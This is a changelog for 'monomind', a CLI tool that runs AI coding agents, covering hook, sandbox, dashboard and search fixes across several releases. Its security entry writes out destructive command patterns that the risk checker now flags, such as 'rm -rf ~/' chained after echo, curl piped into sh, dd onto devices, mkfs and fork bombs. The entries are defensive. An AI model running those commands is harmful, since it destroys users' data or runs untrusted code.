- **The graph gate no longer blocks the first grep of a session; it adds a one-time reminder instead** ([#413](https://github.com/monoes/monomind/issues/413)). The PreToolUse Bash and Grep/Glob hooks blocked the first grep, rg or find of every session until a monograph tool was called. That cost a round trip, and in most blocked sessions the agent just ran grep again. The block also caught greps that were not code searches, such as `… | grep`. The search now goes through, and the first source-code search of a session carries a reminder to try `monograph_query`/`monograph_suggest` as PreToolUse `additionalContext`. The reminder appears once per session, only when the graph is fresh and non-empty, and never for piped greps or searches over dependencies, build output, logs, docs/data files or paths outside the project. The `init` fallback hook-handler behaves the same way. Security gates still block as before. Also fixed: the node count the reminder quotes closed the hook's shared graph handle, which made every later `[MONOGRAPH_HINT]` lookup in that call fail.

- **The per-prompt Second Brain lookup is cheaper and injects only strong matches; its background reindex uses the installed CLI on the docs only** ([#416](https://github.com/monoes/monomind/issues/416)). At a 0.35 floor with up to 3 excerpts, 2 of 27 injected excerpts were relevant (~180 tokens per prompt), and a hung dashboard server held every qualifying prompt for the full 900 ms timeout. The route hook now skips the POST when the pid in `.monomind/control.json` is not alive, waits at most 250 ms, raises the semantic floor to 0.65 (the keyword fallback stays at 0.5) and injects one excerpt, plus a runner-up only when it scores within 0.03 of the top; nothing is injected when no hit clears the floor. `relevanceFloor` and `injectionLimit` in `.monomind/second-brain.json` still override. The session-start reindex ran `npx -y monomind@latest doc ingest .` (a different version than installed, over 2,402 files including package READMEs and duplicates); it now runs the project's `node_modules/.bin/monomind`, a `monomind` on PATH or the monorepo's CLI entry, and skips when none exists, and it ingests only `docs/`, `doc/` and top-level `*.md` (dot-directories such as `.agents`, `.gemini`, `.monomind` and `.mail` are never walked; identical content shares one set of chunks). Only changes inside that scope trigger it. `monomind doc ingest` now takes several paths and ingests them in turn.

- **`agent test --json` reports crush and pi sign-in failures as `auth`** ([#473](https://github.com/monoes/monomind/issues/473)). Without credentials, crush says "No providers configured - please run 'crush' to set up a provider interactively." and pi says "No API key found for the selected model. Use /login to log into a provider via OAuth or API key." Both came back as `status:"error"` (`runner-error`). They are now `auth`, and crush, pi and pi-rpc have a `login_hint` (also shown by `agent scan --json`). Unknown-model and quota errors are classified as before.

- **The dashboard server no longer duplicates itself, hangs on SIGTERM or grows to ~2 GB** ([#477](https://github.com/monoes/monomind/issues/477)). A second `server.mjs` for a project whose dashboard is already running (on the requested port, or on the port `.monomind/control.json` records, confirmed through `/api/identity`) now prints that dashboard's URL and exits 0; another project's server on the port is still skipped as before, and `monomind ui` reports the running dashboard instead of waiting. SIGTERM, SIGINT and SIGHUP now close every SSE stream (the mastermind and per-org streams were left open) and every socket, then exit 0, with a forced exit after 5 s. Sockets were never force-closed because the port-fallback loop removed Node's own `listening` listener, so the HTTP server tracked no connections and `server.close()` waited on open keep-alive and SSE sockets indefinitely, leaving a process with no port that ignored SIGTERM. The memory growth came from `fs.watch({ recursive: true })`, which Linux Node emulates with one inotify watch and one retained `fs.Stats` per file: the `.monomind` watcher alone held ~109,000 watches on one machine. Watchers now watch directories (capped at 2,000) instead of files: 100,000 files under `.monomind` now cost 206 watches and 106 MB RSS at start, down from 100,208 watches and 312 MB. SSE clients that stop reading are dropped once 1 MB is queued, the per-run digest cache is capped at 64 runs, and nothing (watchers, the document sweep) starts before the port is bound.

- **Each org role session gets its own TMPDIR** ([#480](https://github.com/monoes/monomind/issues/480)). Every role of an `org run` shared the daemon's TMPDIR (the release org uses `$HOME/mrg-tmp`), so a bare `mktemp -d` landed in that shared root as `tmp.XXXXXXXXXX`, and one role's `rm -rf tmp.*` there deleted other running roles' scratch too: 13 directories matched where 3 were meant on the 2.19.0 release run. Each role session (each task session with `session_scope: "task"`) now runs with `TMPDIR`, `TMP` and `TEMP` set to its own `<base>/<org>-<role>-XXXXXX/` (mode 0700), where `<base>` is the TMPDIR it had before, so the sandbox and file-tool roots still cover it. The runtime removes a task session's directory when its task closes, the rest when the role's session ends and at org stop, each by exact path and only with this org's and role's prefix; at start it sweeps only this org's directories whose owning process is gone. A `TMPDIR` that a role-specific env overlay sets explicitly still wins. Every role's prompt now says its `$TMPDIR` is private and that cleanup globs must never run in a shared directory.

- **`monomind search` finds documents `doc ingest` just indexed, without `search scan`** ([#479](https://github.com/monoes/monomind/issues/479)). Which content types `search` looks at comes from the directory fingerprint, and that is refreshed only by `search scan` or once it is a day old. A fingerprint taken before any document existed (as `init` writes one) kept the documents type off, so `doc search` found a freshly ingested file and `search` did not. The documents type was also off in a tree where documents are under 10% of the files, even right after a scan. Now, when the project's doc store has live documents, `search` turns the documents type on for that run. This covers everything that writes the project store: `doc ingest`, the MCP `knowledge_ingest` tool, and the session-start auto-ingest. There is no rescan and the saved fingerprint is not rewritten, so an unchanged store costs one read of `doc-metadata.jsonl`. `search` still reads documents from the working tree, so a file ingested from outside it, or into the global brain or a profile store, is found by `doc search` only. `search --help` now says what `search scan` is still needed for: other content types added since the last scan.

- **`config get` prints object and array values instead of `[object Object]`** ([#478](https://github.com/monoes/monomind/issues/478)). `monomind config get memory` printed `memory = [object Object]` because the value went straight into a template string. An object or array value is now printed as indented JSON after `key = `; scalars print as before, and `--format json` was already correct. The full-config table (`config get` with no key) printed arrays with `String()`, so an array of objects showed `[object Object]`; arrays there are now compact JSON (`["a","b"]`, `[]`).

## [2.19.0] — 2026-09-29

### Changed

- **The MCP server advertises a 20-tool core by default** ([#410](https://github.com/monoes/monomind/issues/410)). `tools/list` sent 71 tools (34.7 KB, about 8.7k tokens on clients that load schemas eagerly), and 45 of them only read or write state files: `agent_*`, `task_*`, `session_*`, `config_*`, `system_*`, `guidance_*`, `hooks_*` and `mcp_status`. The default roster is now monograph (build, query, suggest, impact, context, neighbors), `pick`, `org_skill_show`, `monomind_tool_search`, `knowledge_search`/`ingest`/`remove`, `monodesign_detect`/`fix`/`palette`, and the five memory tools the generated CLAUDE.md and the KG nudge name (`memory_pattern-store`, `memory_feedback`, `memory_kg_ingest`, `memory_kg_search`, `memory_kg_stats`), 14.6 KB in all. Every other tool is still callable by name and found through `monomind_tool_search`; `MONOMIND_MCP_FULL=1` still advertises all of them.

### Added

- **Coder mode on every full-access runtime** ([#431](https://github.com/monoes/monomind/pull/431), agent-exec protocol rev 19). `agent exec` now drives claude, codex, copilot, antigravity, opencode, kimicode, grok, qwen, pi — and the new Cline, Aider and DeepSeek Harness (`dsh`) runners — with matched `start`/`status`/`tool`/`done` events and full-access editing/commands, instead of only claude and codex having real coverage. `--effort off|low|medium|high|xhigh|max` (rev 16) is now honored per runtime where the vendor CLI supports it and reported as a status notice where it is ignored. `agent exec` retries a transient provider rate limit (HTTP 429), now its own `rate-limited` code distinct from `quota` (rev 20), up to 3 attempts with ~2s/~4s backoff and jitter or the provider's `Retry-After` hint, each wait capped at 30s and kept inside `--timeout`, emitting a `status` notice before each retry. Cline turns run scoped by default (file edits inside the project only; approval-gated tools refused) unless given full access. `monomind init --target agents` and `--target cline`/`--target aider` write only the files those runtimes read (`AGENTS.md`, or nothing extra) instead of every platform's files.
- **`agent exec --access read`** ([#388](https://github.com/monoes/monomind/issues/388), agent-exec protocol rev 21, capability `agent-exec-access-read`). A turn that can read the project and the web but cannot edit files, run arbitrary commands or start subagents. Allowed: `Read`, `Grep`, `Glob`, `LS`, `WebSearch`, `WebFetch`, `TodoWrite`, `Skill`, `ToolSearch`, caller (stdio) tools, and shell commands that start with `git status|diff|log|show|blame`, `ls`, `cat`, `head`, `tail`, `wc`, `rg`, `grep` or `find` (plus any `--allow-bash-prefix` entries) with no pipes, redirects, chaining, substitution or subshells, and no `find -exec/-delete/-fprint…`, `rg --pre` or `git --output/--ext-diff`. `Edit`, `Write`, `MultiEdit`, `NotebookEdit`, other shell commands and `Task`/`Agent` are denied (`tool_activity` end `denied: true`). Works with `--settings`. claude enforces it itself; codex runs `--sandbox read-only` (never `danger-full-access`, whatever the git level) and pi/pi-rpc run `--tools read,grep,find,ls`. Every other runtime, opencode included, answers `error {code:"unsupported"}`. `agent scan --json` entries gain `access_modes` (e.g. `["scoped","read","full"]`).
- **Caller tools with `agent exec --access full`, and parallel caller calls** ([#389](https://github.com/monoes/monomind/issues/389), agent-exec protocol rev 22, capability `agent-exec-full-access-tools`). `--access full --tools stdio --tools-file …` is supported and tested on claude and every other runtime with `full_access: true`: caller tools sit next to the native tools and use the same `tool_call`/`tool_result` frames and `--tool-timeout` as scoped mode (no monomind maximum; bounded by `--timeout`, and on claude by Claude Code's MCP call timeout — a 130s call was verified). When one assistant message makes several caller calls, all their `tool_call` frames are sent before monomind waits for any result, and results match by `id` in any order (claude marks caller tools `readOnlyHint` so Claude Code runs them concurrently; fence runtimes start a round's calls together). `agent scan --json` entries gain `caller_tools` and `caller_tools_with_full_access`; a runtime that cannot take caller tools in the requested mode answers `error {code:"unsupported"}` instead of dropping them. `--allow-bash-prefix` is still rejected with `--access full`.
- **`agent exec` reports what the vendor CLI really runs with, and `--sandbox` picks its own sandbox** ([#396](https://github.com/monoes/monomind/issues/396), agent-exec protocol rev 23, capability `agent-exec-sandbox`). The default is unchanged: without the new flag, a non-org turn still runs codex with `danger-full-access`, grok without a sandbox, and copilot, qwen, antigravity and others with approvals off. The `start` event now says so, with `native_sandbox` (`read-only`, `workspace-write`, `full`, `none`, or `monomind` for claude, where monomind enforces access itself) and `approvals` (`off`, `on`, `n/a`), and each `agent scan --json` entry gives the same defaults plus `sandbox_modes`. `--sandbox read-only|workspace-write|full` uses the CLI's own sandbox on codex, grok and dsh. `full` means today's default on every runtime. Other modes on other runtimes fail with `unsupported`. The flag can tighten an org role's git level but never loosen it. `--access read` always runs codex read-only, and `--access read --sandbox full` is a usage error. Callers that don't want an unsandboxed turn (e.g. mono-agent) should pass `--sandbox`.

### Fixed

- **The per-prompt Second Brain lookup only sends the prompt to a loopback server** ([#402](https://github.com/monoes/monomind/issues/402)). The route hook POSTed every substantive prompt to the `url` in `.monomind/control.json` without checking where it pointed, so a tampered or committed control.json could send prompts to any host. The POST now happens only when that url is http(s) to `127.0.0.1`, `localhost` or `::1` (no credentials in the url); otherwise the hook skips it and uses the local keyword fallback.
- **monobrowse no longer leaves Chromium profiles in /tmp** ([#395](https://github.com/monoes/monomind/issues/395)). Every browser monobrowse launched got a fresh `--user-data-dir` under `os.tmpdir()` (`monomind-browser-*`, `monomind-browse-*`) that nothing deleted, so they piled up until /tmp ran out of quota. A profile dir monobrowse created is now deleted once its Chrome has exited: on a graceful close, on the kill fallback, on `browse close` from a later process (the session record carries a new `ownsUserDataDir` flag), and when a launch fails. Every launch also sweeps dirs left by a crashed or killed process: only exact monobrowse names directly in tmpdir, real directories (never symlinks), older than 10 minutes, whose owning pid is dead and that no live Chrome still uses (`/proc` command lines on Linux, the profile's `SingletonLock` everywhere). A caller-supplied `userDataDir` is never deleted.
- **The provider API key file and memory databases are gitignored** ([#398](https://github.com/monoes/monomind/issues/398)). `monomind.config.json` (where `providers configure -k` stores the key in plain text), `.swarm/` and `.claude/memory.db` were not ignored after `init`, and doctor's gitignore check still passed. Doctor now requires all three, and `doctor --fix` (which `init` runs) adds any that are missing to the root `.gitignore`. `providers configure` prints where it wrote the key and warns when that file is not gitignored.
- **`mastermind-budgets` now sets caps the org runtime enforces** ([#400](https://github.com/monoes/monomind/issues/400)). Its `set` wrote `.monomind/orgs/<org>-budgets.json`, which nothing in the runtime reads, so a budget set through the skill capped nothing. It now edits `roles[].budget_usd`, `roles[].budget_tokens` and `run_config.budget_tokens` in the org definition, validates it and runs `monomind org reload` (the caps hot-reload with spend kept). `show` and `alert` read spend from `monomind org costs --format json` and the run's budget events. There is no org-wide USD cap, and the skill now says so and refuses to fake one. `reset` is replaced by `clear`, which removes a role's own caps.
- **`mastermind-routines` maps onto the org `schedule`** ([#400](https://github.com/monoes/monomind/issues/400)). It wrote per-agent cron routines to `<org>-routines.json`, which the runtime never runs. It now sets or clears the org's `schedule` interval (applied by `monomind org serve` at start), pauses and resumes with `org pause`/`org resume`, and triggers a run with `org run`. `list` flags any entries left in the old file as not enforced.
- **The dashboard's Budgets data shows the enforced limits.** `GET /api/org/:name/budgets` takes `org_budget` and `agent_budgets` from the org definition (`run_config.budget_tokens`, each role's `budget_usd`/`budget_tokens` or its `policy.maxUsd`/`maxTokens`) instead of `<org>-budgets.json`.
- **`cleanup --force` no longer leaves hooks pointing at deleted helpers** ([#401](https://github.com/monoes/monomind/issues/401)). After a default `init`, `cleanup --force --purge-data` removed `.claude/helpers/` but kept all 17 monomind hooks in `.claude/settings.json`, so every prompt and tool call then failed with `Cannot find module …/hook-handler.cjs`. Cleanup now rewrites `.claude/settings.json` and `.gemini/settings.json` in place, dropping only the hook entries and `statusLine` whose command runs a helper the same plan removes (plus matcher groups and events left empty); other keys and user hooks stay, and a git-tracked settings file is still never rewritten. It also removes the `monomind` server from `.kimi-code/mcp.json`, the `[mcp_servers.monomind]` table from `.codex/config.toml` and init's `npx monomind` bash rules from `opencode.json`. `init` now records hashes for the converted `.opencode/agent`, `.opencode/command` and `.kimi-code/agents` files, `.kimi-code/plugin/kimi.plugin.json` and `.gemini/helpers/statusline.sh`, so cleanup can prove they are untouched installs and remove them; ones you edited are kept. The dry run lists every edit.
- **The SessionStart `session-restore` hook no longer parses every transcript** ([#403](https://github.com/monoes/monomind/issues/403)). After `quickSummary()` went cache-first for #42, session-restore still called `quickSummaryData()`, which re-parsed every transcript under `~/.claude/projects` synchronously (tens of seconds, up to 140 s on active machines). That blocked the event loop, so the handler's own safety timer never fired and Claude Code killed the hook at 15 s. `quickSummaryData()` now reads the same cached totals as `quickSummary()` and starts the detached refresh when the cache is stale or missing, at most once per process. A cold cache writes no `token-summary.json` on that session start.
- **`monograph_suggest task=` returns the nodes relevant to the task** ([#406](https://github.com/monoes/monomind/issues/406)). Suggest answered only from `AMBIGUOUS`/`INFERRED` edges (about 3% of a real graph), so most task descriptions got "No suggestions for this task. Run monograph_build first." even on a fully built index. With `task=` it now lists the top `limit` (default 10) nodes ranked by the same search `monograph_query` uses, each with `file:line`, followed by the graph-topology questions about them when any exist. It says "Run monograph_build first" only when the graph has no nodes; a built graph with no match for the task says that no nodes match.
- **monograph no longer indexes monomind's own asset mirrors, gitignored files or anonymous closures as searchable symbols** ([#404](https://github.com/monoes/monomind/issues/404)). In a fresh 5-file project, 30,405 of ~30,430 nodes came from the `.agents`, `.gemini`, `.kimi-code` and `.opencode` trees `monomind init` writes. The scan now skips `.agents`, `.gemini`, `.kimi-code`, `.opencode`, `.codex`, its own `.monograph` cache and `.mail` by default, and inside a git work tree it only scans files `git ls-files --cached --others --exclude-standard` lists, so `.gitignore` is honoured (tracked files stay in even if they match; a `.monographignore` `!` negation can still bring a file back; outside git the walk is unchanged). Anonymous closures (`() => {`, `function () {`) stay in the graph so calls inside them are still attributed to them, but `monograph_query`/search and god-node rankings no longer return them. `@monoes/monograph` 1.6.14.
- **`monograph_impact` and `monograph_context` no longer pick one of several same-named symbols** ([#405](https://github.com/monoes/monomind/issues/405)). Without a `filePath` both tools took whichever node named `name` came first, so asking about `bridgeStoreEntry` could land on a test mock and report "0 callers, Risk LOW" for a function with 29 call sites. When a name matches more than one definition they now return the candidates (non-test definitions first, with `nodeId`, file and line) and ask you to re-run with `nodeId` or `filePath`, like `monograph_neighbors` already did. Both tools take the new `nodeId` input, and `filePath` also accepts a trailing path fragment. The `[MONOGRAPH_HINT]` grep hint still picks the first match and is left for a follow-up.
- **`monomind memory search` finds matches with default options again** ([#407](https://github.com/monoes/monomind/issues/407)). The `--threshold` option defaulted to 0.7 while the memory bridge and the command's own fallback used 0.3, and correct matches from the bundled embedding model score about 0.55–0.61, so default searches returned nothing. The option default, the bridge and the sql.js fallback now share one `DEFAULT_SEARCH_THRESHOLD` (0.3).
- **`monomind browse …` exits as soon as its output is written** ([#408](https://github.com/monoes/monomind/issues/408)). Every browse subcommand left its CDP websocket open, so the process only ended at the CLI's 5 s force-exit watchdog: `browse get title` took ~5.5 s against 0.3 s through the bare `monobrowse` bin. The command now drops its CDP connection once the subcommand finishes (also when it fails), without touching the browser, so the next command still reuses the session; `get title` now takes ~0.3 s and `open` ~1.6 s instead of ~5.8 s. `@monoes/monobrowse` 1.0.28 exports `disconnectSession()` for this.
- **`[MONOGRAPH_HINT]`s now reach the model, and the status line stops showing an unmeasured "$ saved"** ([#409](https://github.com/monoes/monomind/issues/409)). The PreToolUse pre-search and pre-bash hooks printed their hints (and the graph-gate reminder) as plain stdout, which Claude Code only shows in the transcript, never to the model. They are now one JSON document, `{"hookSpecificOutput":{"hookEventName":"PreToolUse","additionalContext":…}}`; stdout stays empty when there is nothing to say and on any block, whose reason is still on stderr with exit code 2. Each hint was also credited as 1,700 saved tokens, which fed the status line's 💰 dollar figure and `graph-status`'s "saved $". Hints no longer earn savings credit, and both displays show the hint count instead of dollars.
- **The fallback hook-handler's PreToolUse blocks now reach Claude Code** ([#446](https://github.com/monoes/monomind/issues/446)). The fallback `hook-handler.cjs` that `init` writes when the full helpers can't be copied ended with an unconditional `process.exit(0)`, overriding the exit code 2 its graph gate sets to block a command. It now exits with `process.exitCode`, so a block's exit 2 survives.
- **Generated MCP configs start the version that ran `init` instead of `monomind@latest`** ([#419](https://github.com/monoes/monomind/issues/419)). `.mcp.json`, Codex `config.toml`, OpenCode `opencode.json`, Kimi `mcp.json` and the Antigravity/Gemini entries launched `npx -y monomind@latest mcp start`, which re-resolves the dist-tag on every start (3–4 s to `tools/list`), could hang past the client's startup timeout on a cold npx cache and leave `_npx` broken, and could switch versions mid-session. They now run `npx -y --package=@monoes/monomindcli@<version> monomind mcp start`, and the printed `claude mcp add` hints match. `--pin latest` or `--no-pin` keeps `monomind@latest`; `--pin <version>` still picks another version. `monomind init --force` re-pins after an upgrade; `monomind update` does not rewrite these configs. The Codex, OpenCode and Kimi entries also drop the unread `MONOMIND_MODE`, `MONOMIND_HOOKS_ENABLED`, `MONOMIND_TOPOLOGY`, `MONOMIND_MAX_AGENTS` and `MONOMIND_MEMORY_BACKEND` env vars (already gone from `.mcp.json`).
- **The per-prompt route hook is cheaper** ([#415](https://github.com/monoes/monomind/issues/415)). Opening the graph ran `npm root -g` (a 60–250 ms spawn) on every prompt in a project without its own `@monoes/monograph`; the answer is now cached for 24 h in `~/.monomind/cache/npm-root-g.json` (or under `MONOMIND_HOME`), keyed by the node binary, `npm_config_prefix` and `PATH`, and asked again when the cached root is gone. A trivial reply ("ok", "yes", "continue", "thanks", fewer than three content words) now returns before any routing work — no pick, no graph, no Second Brain lookup, no banners — instead of only skipping the pick. The `[PICK]` line names an Org skill by its MCP call only: the `(or: npx -y monomind org skills show …)` suffix, ~40% of the line, is gone, since the picking section `init` writes into CLAUDE.md already gives that CLI fallback.
- **The CLAUDE.md `init` writes is 4 KB instead of 10.7 KB** ([#412](https://github.com/monoes/monomind/issues/412)). It is sent with every request and every subagent, and about 40% of it did not change what the model does in the project. The default (`standard`), `minimal` and `solo` templates drop the CLI command table, Monoswarm Rules, the topology/max-agents Project Config, the curated agent list, Memory Commands, Quick Setup, "Claude Code vs CLI Tools", Support, and the DDD / TDD-London / event-sourcing / "5-10+ todos" mandates; the opt-in `full`, `security` and `performance` templates keep their reference sections. Build & Test lists only the `build`, `test` and `lint` scripts package.json defines (with the detected package manager; the `npm init` placeholder test script does not count) and is left out when there are none. The Second Brain section appears only when the `documents` capability is active, and the agent picking rules only when the `[PICK]` prompt hook is installed. When a parent directory's CLAUDE.md already carries the monomind block, `init` in a subdirectory no longer writes a second copy and prints a warning naming that file. `init --force` over a pre-delimiter CLAUDE.md also replaces the retired sections instead of leaving them behind.
- **`monomind init` no longer installs docs as slash commands or `--minimal` as the full catalog** ([#411](https://github.com/monoes/monomind/issues/411)). Claude Code registers every `.md` under `.claude/commands/` as a command, and its skill/command listing has a fixed budget past which descriptions are dropped. init now leaves out command-directory READMEs, `_`-prefixed includes and `references/` pages (20 descriptionless entries); the task-file spec the mastermind commands read moved to `.claude/skills/mastermind/references/taskfile.md`, and the duplicate `commands/mastermind/references/` copies are gone. `--minimal` installs 23 skills instead of 83: the mastermind engineering workflows (design, plan, execute, review, receive-review, debug, research, worktree) and the pieces they read, monolean, monodesign, stop-slop, verification-quality and the memory, GitHub and browser toolkits, plus the mastermind idea, org and memory skills the platform install always writes; the org-admin mastermind skills, monoswarm, hooks-automation and the rest are a new `extended` skill set, still part of the default install. The init wizard's Custom skill-set answer is now honoured (it left `skills.all` on, so every skill was installed) and no longer writes into the shared presets; it also offers the extended, browser and advanced sets. Agents marked `deprecated: true` are no longer installed, and the `training`/`verify` command groups, which never existed, are gone from the command map.
- **Agents, skills, commands and the guidance catalog only name MCP tools and CLI commands that exist** ([#421](https://github.com/monoes/monomind/issues/421)). Shipped markdown referenced 43 unregistered `mcp__monomind__*` tools 208 times per tree (`swarm_init`, `memory_usage`, `coordination_orchestrate`, `hooks_pre_task`, ...), the guidance catalog behind `guidance_capabilities`/`guidance_recommend` listed 30 tools and 15 commands that do not exist, and optimization agents told the model to run invented `monomind topology-analyze`-style commands. References now point at the real tool (`monoswarm_init`, `monoswarm_memory`, `task_create`, `hooks_pre-task`, `monofence_scan`, `performance_bottleneck`, ...) or are removed where nothing equivalent exists, and the catalog is rebuilt from the live registry. `scripts/lint-tool-refs.mjs` (`pnpm run lint:tool-refs`, run in CI) fails on any `mcp__monomind__<tool>` missing from the full MCP registry, any catalog tool or command that does not resolve, and any unresolved `monomind <cmd>` in an agent definition. The invented `monomind github …` / `monomind actions …` / `monomind swarm …` commands in six GitHub agents (140 references per tree) are still allowlisted in `KNOWN_BAD_CLI_REFS`; the allowlist can only shrink.
- **Session start no longer rebuilds the graph in non-git directories, and builds stop writing into the repo root** ([#414](https://github.com/monoes/monomind/issues/414)). Without a git HEAD the SessionStart freshen hook could never see the index as fresh, so every session started a full rebuild (a non-git workspace parent grew to 3.4 GB). The hook now skips directories outside a git work tree and prints a one-line hint to run `monomind monograph build` yourself, and it starts at most one automatic build per project every 10 minutes (tracked in `.monomind/graph/last-auto-build`). `GRAPH_REPORT.md` is now written to `.monomind/GRAPH_REPORT.md` instead of the repo root; `monomind monograph build --report-path GRAPH_REPORT.md`, `MONOGRAPH_REPORT_PATH` or `buildAsync(..., { reportPath })` restore the old location. The churn cache moved from `.monograph/cache/` to `.monomind/cache/`.
- **`init` no longer runs `npm install @monoes/monograph` in your project** ([#420](https://github.com/monoes/monomind/issues/420)). The code-graph step resolved `@monoes/monograph/dist/src/index.js`, which the package's `exports` map does not expose (`ERR_PACKAGE_PATH_NOT_EXPORTED`), so it always fell back to installing monograph into the user's project: a new `dependencies` entry in `package.json` and about 61 MB of `node_modules`. It now resolves the package's public entry from the CLI's own dependencies. The install fallback is gone; if monograph cannot be loaded, init prints one line saying to run `npx monomind monograph build` later.
- **`init`'s summary counts the files it actually wrote** ([#420](https://github.com/monoes/monomind/issues/420)). It counted report items (a whole skill folder, an agent category) as files and labelled every skip and diagnostic "already exist", so an empty repo that received 2,060 files was told "267 created, 101 already exist". The counts now come from the disk, before and after the run, across the root files and every dot-directory init writes to (all platform trees): directories and files created, existing files updated, and existing files left unchanged.
- **monodesign detection no longer floods its output** ([#424](https://github.com/monoes/monomind/issues/424)). One failing token repeated on hundreds of elements printed one finding per element: `doc/index.html` gave 249 findings for 17 distinct issues, `monodesign_detect` returned about 41 KB, and `design fix --dry-run` printed nearly whole files. The text report now prints one line per (rule, snippet) with its count and up to three example locations (`--no-group` lists every occurrence; `--json` is unchanged). `monodesign_detect` returns the same groups, 20 at a time and most severe first, with rule descriptions listed once and a `more` hint that names the next `offset`; `verbose: true` returns the raw list. Contrast the static analyser cannot measure (translucent text or backgrounds, overlays, gradients, SVG text, or a page with no resolvable surface) is now reported as unverified and left out of the default count, with a line saying how many were held back (`--include-unverified` / `include_unverified: true` shows them). On `doc/design-system.html` that removes 99 of 102 contrast findings. `fix --dry-run` prints one hunk per edit with 3 lines of context instead of a single hunk from the first change to the last.
- **Opening the memory database no longer re-runs its dedupe repairs every time** ([#426](https://github.com/monoes/monomind/issues/426)). `initializeSchema` ran the namespace+key dedupe and the FTS5 duplicate-row cleanup on every open. Both scan every row, which made each `knowledge_search` or `memory` call wait seconds on a large store. They now run only while the database's `PRAGMA user_version` is below the schema version, which is now 4, so each existing store is repaired once more and then skips them. The namespace+key repair also runs whenever the unique index is missing, and an older release that opens the file writes its lower version back, so the next open repairs it again. On a synthetic 20k-entry, 507 MB store, a cold open fell from 3.0–4.5 s to about 10 ms.
- **Semantic search stays on brute force up to 100,000 entries** ([#426](https://github.com/monoes/monomind/issues/426)). The default `MONOMIND_HNSW_THRESHOLD` was 5,000. On the same 20k-entry store, the first search spent 78 s building the HNSW graph and wrote a 389 MB JSON cache, and later searches took 1.2 s to load that cache with about 1 GB peak RSS. Brute-force cosine answered in about 0.25 s at about 330 MB. The default is now 100,000, and setting the env var still overrides it.

### Security

- **`hooks_pre-command` no longer rates destructive compound commands as safe** ([#399](https://github.com/monoes/monomind/issues/399)). The MCP tool capped any command starting with `echo`/`ls`/`cat` at low risk and `git` at 0.2, so `echo hi && rm -rf ~/` and `git push --force origin main` returned `shouldProceed: true` while the PreToolUse Bash gate blocked them. It now splits the command on `&&`, `||`, `;`, `|`, `&` and newlines (quotes respected), checks every segment with no prefix caps, and applies the Bash gate's destructive patterns (mirrored, parity pinned by a test). Force-push to main/master, recursive `rm` of `~`, `$HOME` or `/`, piping into a shell (`curl … | sh`, `cat x | sh`), `dd of=/dev/…`, `mkfs` and fork bombs are critical and `shouldProceed: false`; `ls -la`, `git status` and `echo hi` stay low.

## [2.18.5] — 2026-09-29

### Added

- **`agent exec --effort <level>`** (agent-exec protocol rev 16, capability `agent-exec-effort`). Sets the turn's reasoning effort: `off`, `low`, `medium`, `high`, `xhigh` or `max`. claude gets it as the Agent SDK's `effort` option (`off` disables thinking); codex gets `-c model_reasoning_effort=<level>` (`off` becomes `none`). Other runtimes ignore it, and an unknown level is rejected before the turn starts.
- **`agent exec` reports Claude's native subagents** ([#387](https://github.com/monoes/monomind/issues/387), capability `agent-exec-subagent-events`, agent-exec protocol rev 17). When a claude turn delegates through the `Task`/`Agent` tool, the stream now carries `subagent` events (`started`, `progress`, `finished`) with the subagent's type, description, prompt, summary, last tool, status and usage. Their `tool_use_id` equals the `Task` call's `tool_activity` id, so callers can join the two. New golden fixture `doc/agent-exec-protocol/fixtures/subagent.ndjson`.
- **`monomind agent test <runtime> --json`** ([#390](https://github.com/monoes/monomind/issues/390), agent-exec protocol rev 18, capability `agent-test-json`). One "Reply with the single word: ok" turn (max turns 1, no tools, scoped access, a temporary cwd) reported as one object: `status` (`ok`, `ok_unexpected`, `auth`, `quota`, `model_unavailable`, `timeout`, `missing_binary`, `error`), `reply`, first-text and total latency, tokens, `cost_usd` with `cost_estimated: true` when the cost comes from the pricing table, `runtime_version`, and `error` with the login hint for `auth`. `--model` tests one model. `model_unavailable` recognises each runtime's "unknown model / not available on your plan" wording, which `agent exec` reports as `runner-error`. Without `--json`, `agent test` still streams the NDJSON events as before.

### Fixed

- **A subagent's text no longer leaks into the main agent's output** ([#387](https://github.com/monoes/monomind/issues/387)). On `agent exec --runtime claude`, a subagent's prose was emitted as ordinary `assistant` text and joined into `result.text`. It is now an `assistant` event with `parent_tool_use_id` set to the subagent's `Task` call, and `result.text` holds only the main agent's text.

## [2.18.4] — 2026-09-29

### Added

- **`knowledge-profile-captures` capability** (agent-exec protocol rev 15). `monomind --version --json` now advertises the per-profile web capture behaviour that shipped in 2.18.3: profile envelopes ingest into `profile:<id>` (query-string URLs included), `transcript.md` / `summary.md` are indexed beside `readable.md` instead of superseding it, and `doc search|cite|related|lookup|list --scope profile:<id>` read that store. 2.18.3 itself has the behaviour but not the flag, so callers accept version ≥ 2.18.3 **or** the capability.

### Security

- `undici` bumped from 8.10.0 to 8.11.2 (`chore(deps): bump undici in the npm_and_yarn group across 1 directory`, a6e177f00).
- `ip-address` (transitive) bumped to 10.7.2, closing Dependabot alerts [#245](https://github.com/monoes/monomind/security/dependabot/245) and [#246](https://github.com/monoes/monomind/security/dependabot/246) (`chore(deps): bump transitive ip-address to 10.7.2`, 6ca3f2d42).

## [2.18.3] — 2026-09-29

### Fixed

- **Web captures whose URL has a query string ingest again, in a profile or not.** Every chunk of a capture carries a `url:<canonical url>` tag, and `@monoes/memory` refused tags containing `?`, `=`, `&` or `%`, so any such page (every YouTube video) failed with `all chunk stores failed` and indexed nothing. `url:` and `parent:` tags now follow the same rule as `src:` (anything but control characters), a URL too long for a tag is left off the chunk rather than failing it, and a refused store now says why in the ingest error. Also: the extra documents a mono-agent capture carries beside `readable.md` (`transcript.md`, `summary.md`) no longer supersede each other under their shared URL, so all of them stay searchable and a repeat ingest is a no-op; and `doc cite` / `doc related` with `--scope profile:<id>` read that profile's store instead of the project's.

## [2.18.2] — 2026-09-28

### Fixed

- **`monomind init --target claude` adds only Claude Code's files** ([#372](https://github.com/monoes/monomind/issues/372)). It still created `.gemini/` (skills and rules) and `.agents/` (skills and `shared_instructions.md`), which only Antigravity/Gemini and the other agents read — noise in a user's own repo, where mono-agent's coder mode runs it. They are now created only when a platform that reads them is selected; the default all-targets init is unchanged, and a Claude-only init keeps its project memory seeds. The CLI reference's init row is corrected to match.

## [2.18.1] — 2026-09-28

### Fixed

- **`monograph watch` no longer waits on a dead build that only looked alive** ([#370](https://github.com/monoes/monomind/issues/370)). The build lock held just a pid, and a pid only means something inside its own pid namespace: sandboxed tools give every command a fresh namespace with small, reused pids, so a killed sandboxed build left "pid 47" and the next sandbox found an unrelated pid 47 alive — every rebuild was deferred for up to 30 minutes. The lock now records its pid namespace and boot id: a lock from another boot is taken over at once, and one from another namespace once its 30-second heartbeat has been silent for 2 minutes.
